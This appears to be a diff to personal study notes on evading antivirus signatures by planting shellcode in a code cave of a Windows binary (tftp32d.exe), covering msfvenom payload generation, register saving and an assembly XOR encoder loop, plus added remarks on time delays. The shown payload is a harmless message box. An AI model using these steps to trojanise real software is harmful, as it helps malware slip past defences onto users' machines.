@@ -1,4 +1,6 @@
-# Basic Signature bypass (e.g. tftp32d.exe)
+# Basic Signature bypass (e.g. tftp32d.exe) (the old version 272)
+# XOR encode is not a good option since the AV can detect (some of) obfuscations
+# adding time delay may be able to bypass Signature detection
 
 ## Preparation (if the code cave is limited)
 ### 1. Use LordPE to add a code cave, edit code cave (e.g. 1000 hex size) to be executable
@@ -39,7 +41,7 @@ size : 1C
 ```
 pushad
 pushfd
-push eax * 8
+push eax * 8 (if need)
 ```
 - Remark the ESP address after pushfd for further actions
 - push eax * 8 for avoiding stack changing by shellcode
@@ -53,7 +55,7 @@ msfvenom -a x86 --platform windows -p windows/messagebox TEXT="POWERUP" -b '\x00
 ```
 push EBX                             # save ebx original value
 MOV EAX,0046C010                     # save starting address of shellcode address to eax
-MOV EBX,42                           # declare a magic number you like, e.g. 42 
+MOV EBX,42                           # declare a magic number you like, e.g. 42
 XOR BYTE PTR DS:[EAX],BL             # xor magic number and shellcode in stack
 INC EAX                              # increas the address position
 INC EBX                              # change the ebx value
